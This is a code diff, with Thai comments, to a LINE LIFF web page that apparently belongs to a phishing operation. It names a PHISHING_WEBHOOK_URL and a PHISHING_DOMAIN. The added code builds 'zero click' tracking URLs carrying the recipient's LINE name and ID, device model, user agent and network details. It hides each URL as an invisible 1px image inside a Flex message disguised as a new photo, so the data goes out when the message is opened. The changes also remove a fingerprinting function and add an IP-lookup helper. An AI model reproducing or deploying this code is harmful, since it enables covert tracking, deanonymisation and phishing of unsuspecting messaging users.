@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbytR505idN_pn3SmaYs16soPQ456-TDnEZH2tXHRueg_2SHju9R8fVEEX1XIHPcENNq0g/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw6RuLHtJlmDxWH61uejF_wiPF2BNt6YIg5xqIz_IY8wQRxe8XcDJvldb_SVVlZ_sv2Qw/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -823,40 +823,40 @@
                 // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // ดึงข้อมูลอุปกรณ์ละเอียดสำหรับส่งไปกับ Zero Click
-                const deviceData = getEnhancedDeviceInfo();
-                const timestamp = new Date().toISOString();
+                // ดึงข้อมูลอุปกรณ์เพิ่มเติมเพื่อส่งไปกับ Zero Click
+                const enhancedDeviceInfo = getEnhancedDeviceInfo();
+                const connectionInfo = getConnectionInfo();
                 
                 // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
-                // ปรับปรุงให้ส่งพารามิเตอร์น้อยลงแต่ใช้ฟอร์แมต Base64 เพื่อรวมข้อมูลให้อยู่ในพารามิเตอร์เดียว
-                const zeroClickData = {
-                    key: trackingKey,
-                    case: caseName,
-                    creator: userId,
-                    name: displayName,
-                    deviceType: deviceData.deviceType,
-                    deviceModel: deviceData.deviceModel,
-                    platform: deviceData.platform,
-                    browser: deviceData.browser,
-                    screenSize: deviceData.screenSize,
-                    language: deviceData.language,
-                    timestamp: timestamp,
-                    ua: navigator.userAgent.substring(0, 100), // ส่ง UA แบบย่อ
-                    version: "2.0" // เพิ่มเวอร์ชันเพื่อติดตามการอัปเดต
-                };
-                
-                // แปลงข้อมูลเป็น JSON และเข้ารหัส Base64
-                const encodedData = btoa(JSON.stringify(zeroClickData));
-                
-                // สร้าง URL ด้วยพารามิเตอร์น้อยลงแต่มีข้อมูลครบถ้วน
+                // ใช้เป็นพารามิเตอร์ในการโหลดภาพเล็กๆ ที่มองไม่เห็น
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
-                zeroClickTrackUrl += `&data=${encodeURIComponent(encodedData)}`; 
-                zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
+                zeroClickTrackUrl += `&key=${trackingKey}`;
+                zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
+                zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
+                zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
+                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                
+                // เพิ่มข้อมูลอุปกรณ์
+                zeroClickTrackUrl += `&deviceType=${encodeURIComponent(enhancedDeviceInfo.deviceType)}`;
+                zeroClickTrackUrl += `&deviceModel=${encodeURIComponent(enhancedDeviceInfo.deviceModel)}`;
+                zeroClickTrackUrl += `&platform=${encodeURIComponent(enhancedDeviceInfo.platform)}`;
+                zeroClickTrackUrl += `&browser=${encodeURIComponent(enhancedDeviceInfo.browser)}`;
+                zeroClickTrackUrl += `&language=${encodeURIComponent(navigator.language || 'unknown')}`;
+                zeroClickTrackUrl += `&screenSize=${encodeURIComponent(window.screen.width + 'x' + window.screen.height)}`;
+                zeroClickTrackUrl += `&userAgent=${encodeURIComponent(navigator.userAgent)}`;
+                
+                // เพิ่มข้อมูลการเชื่อมต่อ
+                zeroClickTrackUrl += `&netType=${encodeURIComponent(connectionInfo.type || 'unknown')}`;
+                zeroClickTrackUrl += `&netEffective=${encodeURIComponent(connectionInfo.effectiveType || 'unknown')}`;
+                zeroClickTrackUrl += `&netSpeed=${encodeURIComponent(connectionInfo.downlink || 'unknown')}`;
+                
+                // ป้องกันแคชและระบุรุ่นโค้ด
+                zeroClickTrackUrl += `&r=${randomSuffix}`;
+                zeroClickTrackUrl += `&v=2.0`; // เพิ่มเวอร์ชันเพื่อทราบว่าเป็นโค้ดที่ปรับปรุงแล้ว
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
-                console.log("Zero Click Data:", zeroClickData);
 
-                // ปรับปรุง Flex Message ให้เพิ่มโอกาสในการโหลดข้อมูล Zero Click
+                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก tracking image ขนาดเล็กที่มองไม่เห็น
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
@@ -877,26 +877,17 @@
                             type: 'box',
                             layout: 'vertical',
                             contents: [
-                                // ใส่รูปภาพ tracking หลายขนาดเพื่อเพิ่มความน่าจะเป็นที่จะโหลด
+                                // ใส่รูปภาพขนาด 1x1 pixel ที่โปร่งใสเพื่อทำ zero click tracking
+                                // รูปนี้จะไม่ปรากฏในข้อความแต่จะโหลดเมื่อผู้รับเปิดข้อความ
                                 {
                                     type: 'image',
                                     url: zeroClickTrackUrl,
                                     size: '1px', // ขนาดเล็กมาก
                                     aspectRatio: '1:1',
                                     aspectMode: 'cover',
-                                    position: 'absolute',
-                                    offsetTop: '0px',
+                                    position: 'absolute', // วางแบบ absolute
+                                    offsetTop: '0px',     // ซ่อนไว้ที่มุมบนซ้าย
                                     offsetStart: '0px'
-                                },
-                                {
-                                    type: 'image', // รูปที่ 2 ขนาดเล็กกว่า
-                                    url: `${zeroClickTrackUrl}&v=2`, // เพิ่มพารามิเตอร์เพื่อป้องกันการใช้แคช
-                                    size: '0.5px',
-                                    aspectRatio: '1:1',
-                                    aspectMode: 'cover',
-                                    position: 'absolute',
-                                    offsetTop: '3px',
-                                    offsetStart: '3px'
                                 },
                                 // ใส่ box ว่างๆ เพื่อให้มี body content แต่จะไม่แสดงอะไร
                                 {
@@ -907,7 +898,7 @@
                                     width: '1px'
                                 }
                             ],
-                            height: '5px', // เพิ่มความสูงเล็กน้อยเพื่อให้แน่ใจว่ามีพื้นที่ให้โหลด
+                            height: '1px', // ทำให้ body กล่องเล็กมาก
                             paddingAll: '0px'
                         }
                     }
@@ -998,9 +989,7 @@
                 screenSize: `${window.screen.width}x${window.screen.height}`,
                 pixelRatio: window.devicePixelRatio || 1,
                 orientation: screen.orientation ? screen.orientation.type : 'unknown',
-                language: navigator.language || navigator.userLanguage || "ไม่ทราบ",
-                connection: getConnectionInfo(),
-                uniqueID: generateDeviceFingerprint() // เพิ่มการสร้าง fingerprint เพื่อระบุตัวตนได้ดีขึ้น
+                connection: getConnectionInfo()
             };
             
             // ระบบปฏิบัติการ (ละเอียดขึ้น)
@@ -1045,7 +1034,6 @@
             // เบราว์เซอร์ (ละเอียดขึ้น)
             if (/Line/.test(ua)) {
                 deviceInfo.browser = "LINE " + (ua.match(/Line\/([0-9\.]+)/) ? ua.match(/Line\/([0-9\.]+)/)[1] : "");
-                deviceInfo.isLineApp = true; // ระบุว่าเป็นแอป LINE
             } else if (/EdgA?\//.test(ua)) {
                 deviceInfo.browser = "Edge " + (ua.match(/EdgA?\/([0-9\.]+)/) ? ua.match(/EdgA?\/([0-9\.]+)/)[1] : "");
             } else if (/Chrome\//.test(ua) && !/Chromium|Edge/.test(ua)) {
@@ -1057,7 +1045,7 @@
             } else if (/MSIE|Trident/.test(ua)) {
                 deviceInfo.browser = "Internet Explorer " + (ua.match(/(?:MSIE |rv:)([0-9\.]+)/) ? ua.match(/(?:MSIE |rv:)([0-9\.]+)/)[1] : "");
             }
-
+            
             // รุ่นอุปกรณ์ (ละเอียดขึ้น)
             if (/iPhone/.test(ua)) {
                 const matches = ua.match(/iPhone(?:\s+OS)?\s+([0-9_]+)/);
@@ -1080,18 +1068,6 @@
                     deviceInfo.deviceModel = genericModel ? genericModel[1].trim() : "Android Device";
                 }
             }
-            
-            // พยายามดึงข้อมูลตำแหน่งจาก IP (จะส่งคำขอไปที่ ipinfo.io)
-            try {
-                fetch('https://ipinfo.io/json')
-                .then(response => response.json())
-                .then(data => {
-                    if (data && data.loc) {
-                        deviceInfo.ipLocation = data.loc;
-                    }
-                })
-                .catch(() => {});
-            } catch (e) {}
             
             return deviceInfo;
         }
@@ -1118,28 +1094,18 @@
             };
         }
 
-        // เพิ่มฟังก์ชันเพื่อสร้าง device fingerprint ที่มีโอกาสระบุตัวตนได้ดีขึ้น
-        function generateDeviceFingerprint() {
-            const components = [
-                navigator.userAgent,
-                navigator.language,
-                window.screen.width + 'x' + window.screen.height,
-                new Date().getTimezoneOffset(),
-                navigator.platform,
-                !!navigator.cookieEnabled,
-                !!window.localStorage,
-                !!window.indexedDB
-            ];
-            
-            // สร้าง hash อย่างง่ายจากข้อมูล
-            let hash = 0;
-            const str = components.join('###');
-            for (let i = 0; i < str.length; i++) {
-                hash = ((hash << 5) - hash) + str.charCodeAt(i);
-                hash |= 0; // แปลงเป็น 32bit integer
+        // ฟังก์ชันดึงข้อมูล IP ผ่าน API (ทำงานแบบ best-effort)
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipinfo.io/json', { timeout: 2000 });
+                if (!response.ok) {
+                    throw new Error(`Failed to fetch IP info: ${response.status}`);
+                }
+                return await response.json();
+            } catch (error) {
+                console.warn("Could not fetch IP info:", error);
+                return null; // ล้มเหลวแต่ไม่ทำให้โปรแกรมหยุดทำงาน
             }
-            
-            return 'fp_' + Math.abs(hash).toString(36);
         }
     </script>
 </body>
